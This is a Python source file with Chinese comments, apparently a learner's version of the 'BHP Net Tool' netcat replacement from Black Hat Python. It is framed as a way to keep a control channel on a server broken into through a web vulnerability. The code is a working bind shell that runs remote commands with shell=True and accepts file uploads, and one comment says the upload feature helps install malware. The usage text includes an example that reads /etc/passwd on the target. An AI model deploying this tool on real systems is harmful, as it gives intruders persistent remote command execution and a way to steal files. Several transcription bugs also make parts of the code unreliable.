"""
netcat是网络界的“瑞士军刀”，所以聪明的系统管理员都会将它从系统中移除。

不止在一个场合，我进入的服务器没有安装netcat却安装了Python。

在这种情况下，需要创建一个简单的客户端和服务器用来传递想使用的文件，
或者创建一个监听端让自己拥有控制命令行的操作权限。

如果你是通过Web应用漏洞进入服务器的,那么在后台调用Python创建备用的控制通道显得尤为实用，
这样就不需要首先在目标机器上安装木马或后门了。
创建这样一个工具也是个不错的Python习题，让我们开始吧。
"""
# 导入所有需要的python库
import sys              # 提供Py运行环境的变量和函数服务
import socket           # 提供网络服务
import getopt           # 提供解析命令行参数服务
import threading        # 提供py3多线程服务
import subprocess       # 提供子进程管理服务
import logging          # 第一次没跑通，搞搞日志

logging.basicConfig(level=logging.WARNING)
# 定义一些全局变量
listen               = False    # 如True，可理解为服务器。否则为客户端。
command              = False    # 是否建立shell
upload               = False    # 是否上传？？？？变量未使用
upload_destination   = ''       # 数据传送的目标文件。上传文件，目标路径。
execute              = ''       # 在目标机上执行的命令。
target               = ''       # 目标主机
port                 = 0        # 目标端口号
"""
这里导入了说有需要的py库并设置了些全局变量。
接下来创建主函数处理命令行参数和调用编写的其他函数。
"""


# 使用说明
def usage():
    """ usage()函数用于参数的说明帮助、当用户输入错误的参数时会输出相应的提示 """
    print('\n\nBHP Net Tool\n')
    print('Usage: bhpnet.py -t target_host -p port')
    print('-l --listen              - listen on [host]:[port] for incoming connections')
    print('-c --command             - execute the given file upon receiving a connection')
    print('-u --upload=destination  - initialize a command shell')
    print('-e --execute=file_to_run - upon receiving connection upload a file and write to [dextination]')
    print('\nExamples:')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -c')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\'cat /etc/passwd\'')
    print('echo: "ABCDEFGHI" | ./bhpnet.py -t 192.168.11.12 -p 135')
    sys.exit(0)

# function 1 start and end
def clients_sender(buffer):
    """
        clients_sender()函数用于与目标主机建立连接并交互数据直到没有更多的数据发送回来，
        然后等待用户下一步的输入并继续发送和接收数据，直到用户结束脚本运行；
    """
    print('创建socket服务')    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('创建socket服务完成')    

    try:
        # 连接服务器
        print('连接目标主机') 
        client.connect((target, port))
        print('目标主机已连接   %s:%d' % (target, port))

        if len(buffer):
            print("发送：%s" % buffer)
            client.send(buffer.encode())

        while True:
            # 现在等待数据传回
            recv_len = 1
            response = ''

            while recv_len:
                data        = client.recv(4096)
                print("data:%s" % type(data), data)

                response    += data.decode("utf-8")
                print("response:%s" % type(response), response)

                # 如果小于4096就表示数据已经接受完毕。
                if recv_len < 4096:  
                    break

            print(response, end=" ")

            # 等待更多输入
            buffer = input('')
            buffer += '\n'
            # 发送
            print("发送：%s" % buffer)
            client.send(buffer.encode())

    except Exception as e:
        print(e)
        print("[*] Exception! Exiting.")
    finally:
        # teardown the connection
        client.close()
    
    """
        从建立一个tcp嵌套字对象开始，
        首先检测是否已经从标准输入中接受到了数据。
        如果一切正常，就将数据发送给远程目标主机并接受回传数据，直到没有更多的数据发送回来。
        然后，等待用户下一步的输入并继续发送和接受数据，直到用户结束脚本运行。

        附加的异常处理用来对用户的输入进行特殊处理，
        这样我们的客户端就能与命令行shell兼容。

        现在，我们继续创建服务器端的主循环和子函数，
        用来对命令行shell的创建和命令的执行处理
    """


# function 2-3 end  执行命令，并将执行结果返回
def run_command(command):
    """ run_command()函数用于执行命令，其中subprocess库提供多种与客户端程序交互的方法； """
    # 删除字符串末尾的空格
    command = command.rstrip()
    print("执行命令: %s" % command)        

    # 运行命令并将输出返回
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        print(e)
        output = "Failed to execute command.\r\n"

    # 将输出发送
    print("输出:%s  |||   %s" % (type(output), output))
    return output


# function 2-2  服务端线程，处理客户的连接任务。
def client_handler(client_socket):
    print("新建线程处理客户的连接任务")
    """
        client_handler()函数用于实现文件上传、命令执行和与shell相关的功能，
        其中wb标识确保是以二进制的格式写入文件、从而确保上传和写入的二进制文件能够成功执行；
    """
    global upload
    global execute
    global command

    # 检测上传文件=============1
    if len(upload_destination):
        print("检测到上传文件")
        # 读取所有字符并写下目标
        file_buffer = ''

        # 持续读取数据直到没符合的数据============2
        print("接受数据")
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer +=data
        
        # 现在我们接受这些数据并将他们写出来============3
        try:
            print("写入文件")
            file_descriptor = open(upload_destination,'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            # 确认文件已经写出来
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to saved file to %s\r\n" % upload_destination)
    
    
    # 检查命令执行
    if len(execute):
        print("检查命令执行")
        # 运行命令
        output = run_command(execute)
        client_socket.send(output)

    # 如果需要一个命令行shell，那么我们进入另一个循环============4
    if command:
        print("建立命令行shell")
        while True:
            # 跳出一个窗口
            print("建立成功，发送BHP窗口")
            client_socket.send(b"<BHP:#> ")
            
            # 现在我们接收文件直到发现换行符
            print("接受客户端命令")
            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode("utf-8")
            
            # 返回命令行输出
            print("执行客户端命令")
            response = run_command(cmd_buffer)

            # 返回相应数据
            print("返回命令处理结果")
            client_socket.send(response)
    """
        第一段的代码负责检测我们网络工具在建立连接之后是否设置为接收文件，
        这样有助于我们上传和执行测试脚本、安装恶意软件或者让恶意软件清除我们的py脚本

        首先在循环中（2）接受文件数据，保证数据完全接受。
        然后打开一个文件语柄并将内容写入文件中。
        wb的标示确保我们是以二进制的格式写入文件，这样我们就能确保我们上传和写入的二进制文件能够成功执行。

        之后我们添加文件的执行功能（3），通过调用我们之前写好的run_command函数执行文件并将结果通过网络回传。

        最后一段代码处理我们的命令行shell（4）：程序持续处理输入的数据执行命令并将输出回传。

        你会注意到函数在扫描每一行的换行字符以决定何时处理命令，这就会让它和netcat一样好用。
        然而，如果你自己编写一个py客户端与它交互，那么要记得添加换行符。
    """


# function 2-1 start    服务端侦听客户端发起的连接，根据情况建立子线程以处理任务。
# 客户端发送消息-->服务端，并接收服务端的回馈消息。
def server_loop():
    """ server_loop()函数用于建立监听端口并实现多线程处理新的客户端； """
    global target
    global port

    # 如果没有定义目标，那么我们监听所有接口
    if not len(target):
        target = '0.0.0.0'
    
    print("建立socket-tcp服务器")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    print("建立socket-tcp服务器完成，监听    %s:%d" % (target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        print("服务接受    %s:%d" % addr)
        # 分析一个线程处理新的客户端
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


# 主函数，识别参数，以进入不同的工作模式（子函数）
def main():
    """
        主函数main()中是先读取所有的命令行选项从而设置相应的变量，
        然后从标准输入中读取数据并通过网络发送数据，
        若需要交互式地发送数据需要发送CTRL-D以避免从标准输入中读取数据，
        若检测到listen参数为True则调用server_loop()函数准备处理下一步命令。
    """
    global listen
    global command
    global execute
    global target
    global upload_destination
    global port

    if not len(sys.argv[1:]):
        usage()

    # 读取命令行选项
    try:
        l = ['help', 'listen', 'command', 'target=', 'port=', 'execute=', 'upload=']
        opts, args = getopt.getopt(sys.argv[1:], "hlct:p:e:u:", l)
        print('分析出格式信息的命令行参数==>', opts)
        print('不属于格式信息的命令行参数==>', args)
    except getopt.GetoptError as err:
        print(str(err))
        usage()


    for o,a in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = a
        elif o in ('-c', '--commandshell'):
            command = True
        elif o in ('-u', '--upload'):
            upload_destination = a
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-p', '--port'):
            port = int(a)
        else:
            assert False,'Unhandled Option'


    # 进行监听还是仅从标准输入发送数据？
    if not listen and len(target) and port > 0:
        # 从命令行读取内存数据
        # 这里将阻塞，所以不在向标准输入发送数据时发送 CTRL-D
        beffer = sys.stdin.read()
        # 作为客户端，给服务端发送消息。
        clients_sender(beffer)
    

    # 开始监听并准备上传文件、执行命令
    # 放置一个反弹shell
    # 取决于上面的命令行选项
    if listen:
        server_loop()

    """
        上面的代码读入所有的命令行选项，通过检测选项设置必要的变量。
        如果命令行参数不符合我们的标准就打印出工具的帮助信息。

        如注释所示，如果需要交互式的发送数据，你需要发送 CTRL-D 以避免从标准输入中读取数据。
        在最后一段代码中，如果检测到listen参数为True,我们则建立一个监听的嵌套字，
        准备处理下一步的命令（上传文件，执行命令，开启一个新的命令行shell）。

        接下来的代码中，我们要模仿 netcat 从标准输入中读取数据，并通过网路发送数据。
    """


if __name__ == "__main__":
    main()
